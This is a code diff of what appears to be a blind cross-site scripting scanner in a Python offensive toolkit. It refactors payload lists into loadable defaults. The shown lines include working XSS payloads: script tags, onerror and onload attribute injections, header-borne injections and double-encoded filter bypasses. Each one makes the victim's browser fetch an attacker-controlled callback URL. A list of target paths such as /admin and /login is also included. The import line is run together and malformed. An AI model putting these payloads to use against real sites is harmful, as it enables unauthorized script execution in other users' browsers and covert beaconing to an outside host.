@@ -17,7 +17,7 @@ Fluxo:
 """
 import argparseimport loggingimport uuidfrom dataclasses import asdict, dataclassimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.blindxss")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
     "input": ["script_input", "img_input", "svg_input", "iframe_input", "details_input"],
     "header": ["referer_xss", "useragent_xss", "cookie_xss", "xforwarded_xss", "custom_header_xss"],
     "attr": ["alt_xss", "title_xss", "placeholder_xss", "href_xss", "src_xss"],
@@ -25,7 +25,14 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "bypass": ["double_encode", "null_terminate", "case_mixed", "unicode_bypass", "whitespace_bypass"],
 }
 
-_INPUT_PAYLOADS: list[tuple[str, str, list[str]]] = [
+def _load_category_map() -> dict[str, list[str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+_CATEGORY_MAP = _load_category_map()
+
+_INPUT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
     (
         "script_input",
         '<script>fetch("{{callback}}")</script>',
@@ -52,8 +59,14 @@ _INPUT_PAYLOADS: list[tuple[str, str, list[str]]] = [
         ["details", "ontoggle", "callback"],
     ),
 ]
+def _load_input_payloads() -> list[tuple[str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"input_payloads": [list(t) for t in _INPUT_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("input_payloads", [list(t) for t in _INPUT_PAYLOADS_DEFAULT])]
 
-_HEADER_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
+_INPUT_PAYLOADS = _load_input_payloads()
+
+_HEADER_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "referer_xss",
         "Referer",
@@ -85,8 +98,14 @@ _HEADER_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
         ["script", "callback", "custom"],
     ),
 ]
+def _load_header_payloads() -> list[tuple[str, str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"header_payloads": [list(t) for t in _HEADER_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("header_payloads", [list(t) for t in _HEADER_PAYLOADS_DEFAULT])]
 
-_ATTR_PAYLOADS: list[tuple[str, str, list[str]]] = [
+_HEADER_PAYLOADS = _load_header_payloads()
+
+_ATTR_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
     (
         "alt_xss",
         '" onerror="fetch(\'{{callback}}\')" alt="',
@@ -113,8 +132,14 @@ _ATTR_PAYLOADS: list[tuple[str, str, list[str]]] = [
         ["onload", "callback", "src"],
     ),
 ]
+def _load_attr_payloads() -> list[tuple[str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"attr_payloads": [list(t) for t in _ATTR_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("attr_payloads", [list(t) for t in _ATTR_PAYLOADS_DEFAULT])]
 
-_EVENT_PAYLOADS: list[tuple[str, str, list[str]]] = [
+_ATTR_PAYLOADS = _load_attr_payloads()
+
+_EVENT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
     (
         "onerror_xss",
         '"><img src=x onerror="fetch(\'{{callback}}\')">',
@@ -141,8 +166,14 @@ _EVENT_PAYLOADS: list[tuple[str, str, list[str]]] = [
         ["onstart", "callback", "marquee"],
     ),
 ]
+def _load_event_payloads() -> list[tuple[str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"event_payloads": [list(t) for t in _EVENT_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("event_payloads", [list(t) for t in _EVENT_PAYLOADS_DEFAULT])]
 
-_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
+_EVENT_PAYLOADS = _load_event_payloads()
+
+_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
     (
         "double_encode",
         '%253Cscript%253Efetch(%2522{{callback}}%252522)%253C%252Fscript%253E',
@@ -169,11 +200,23 @@ _BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
         ["script", "callback", "whitespace"],
     ),
 ]
+def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]})
+    return [tuple(x) for x in data.get("bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT])]
 
-_SENSITIVE_PATHS: list[str] = [
+_BYPASS_PAYLOADS = _load_bypass_payloads()
+
+_SENSITIVE_PATHS_DEFAULT: list[str] = [
     "/contact", "/feedback", "/comment", "/search", "/login",
     "/profile", "/settings", "/admin", "/api/submit", "/form",
 ]
+def _load_sensitive_paths() -> list[str]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "blindxss", default={"sensitive_paths": _SENSITIVE_PATHS_DEFAULT})
+    return data.get("sensitive_paths", _SENSITIVE_PATHS_DEFAULT)
+
+_SENSITIVE_PATHS = _load_sensitive_paths()
 
 
 def _generate_callback(webhook_url: str) -> str:
